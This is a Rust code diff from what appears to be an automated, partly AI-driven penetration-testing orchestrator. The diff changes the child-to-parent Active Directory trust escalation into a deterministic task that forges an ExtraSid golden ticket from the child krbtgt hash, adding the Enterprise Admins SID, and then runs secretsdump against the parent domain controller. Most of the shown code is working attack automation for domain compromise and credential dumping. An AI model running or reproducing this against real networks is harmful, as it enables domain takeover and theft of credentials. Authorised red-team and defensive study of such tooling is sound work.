@@ -575,8 +575,42 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         continue;
                     }
 
+                    // Convert child-to-parent escalation to deterministic task like
+                    // cross-forest forge: run generate_golden_ticket + secretsdump_kerberos
+                    // sequentially on the worker without LLM parameter laundering.
+                    let mut golden_payload = json!({
+                        "techniques": ["generate_golden_ticket", "secretsdump_kerberos"],
+                        "vuln_type": "child_to_parent",
+                        "vuln_id": &vuln_id,
+
+                        // generate_golden_ticket args
+                        "domain": child_domain,
+                        "username": "Administrator", // RID-500 name, resolved from state
+                        "ticket_path": "Administrator.ccache",
+
+                        // secretsdump_kerberos args
+                        "target": parent_dc_ip.as_str(), // parent DC hostname if available
+                        "target_ip": &parent_dc_ip,
+                        "domain": parent_domain,
+                        "dc_ip": &parent_dc_ip,
+                    });
+
+                    // Add resolved SIDs
+                    if let Some(source_sid) = payload.get("source_sid") {
+                        golden_payload["domain_sid"] = source_sid.clone();
+                    }
+                    if let Some(target_sid) = payload.get("target_sid") {
+                        golden_payload["extra_sid"] =
+                            json!(format!("{}-519", target_sid.as_str().unwrap_or("")));
+                    }
+
+                    // Add child krbtgt hash if available
+                    if let Some(krbtgt_hash) = payload.get("child_krbtgt_hash") {
+                        golden_payload["krbtgt_hash"] = krbtgt_hash.clone();
+                    }
+
                     match dispatcher
-                        .throttled_submit("exploit", "privesc", payload, 1)
+                        .throttled_submit("credential_access", "privesc", golden_payload, 1)
                         .await
                     {
                         Ok(Some(task_id)) => {
@@ -585,7 +619,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 child_domain = %child_domain,
                                 parent_domain = %parent_domain,
                                 auth = auth_method,
-                                "Child-to-parent escalation dispatched"
+                                "Child-to-parent escalation dispatched (deterministic ExtraSid golden ticket, no LLM)"
                             );
                             let _ = dispatcher
                                 .state
@@ -726,7 +760,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     }
 
                     match dispatcher
-                        .throttled_submit("credential_access", "credential_access", payload, 2)
+                        .throttled_submit("credential_access", "privesc", payload, 2)
                         .await
                     {
                         Ok(Some(task_id)) => {
@@ -1090,7 +1124,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             // expand_technique_task runs both tools deterministically with
             // the orchestrator-supplied args. No LLM agent involved.
             match dispatcher
-                .throttled_submit("credential_access", "credential_access", ticket_payload, 1)
+                .throttled_submit("credential_access", "privesc", ticket_payload, 1)
                 .await
             {
                 Ok(Some(task_id)) => {
